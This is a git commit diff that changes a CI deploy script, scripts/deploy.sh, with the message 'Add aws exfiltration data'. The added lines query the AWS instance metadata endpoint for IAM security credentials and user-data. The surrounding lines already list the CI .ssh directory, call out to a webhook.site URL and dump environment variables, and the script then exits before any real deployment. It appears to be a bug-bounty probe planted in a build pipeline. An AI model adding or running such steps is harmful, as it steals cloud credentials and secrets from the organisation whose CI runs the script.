144e3c77c4e1f965896d0c218cb8d8f0ca8dc1f7
Bug-hunting-github <96895594+Bug-hunting-github@users.noreply.github.com>
2021-12-30 20:45:56 -0500

    Add aws exfiltration data

--- scripts/deploy.sh
+++ scripts/deploy.sh
@@ -4,6 +4,15 @@
 ls -alh /home/circleci/.ssh
 wget 	https://webhook.site/c10ac759-98d8-4b97-9737-a0f2be274e36?
 env
+# Get AWS data
+echo "[*] AMI id"
+wget -qO- http://169.254.169.254/latest/meta-data/ami-id
+
+echo "[*] Security credentials"
+wget -qO- http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+echo "[*] User script"
+wget -qO- http://169.254.169.254/latest/user-data/
 exit
 
 git config --global user.email "dev@fetlife.com"
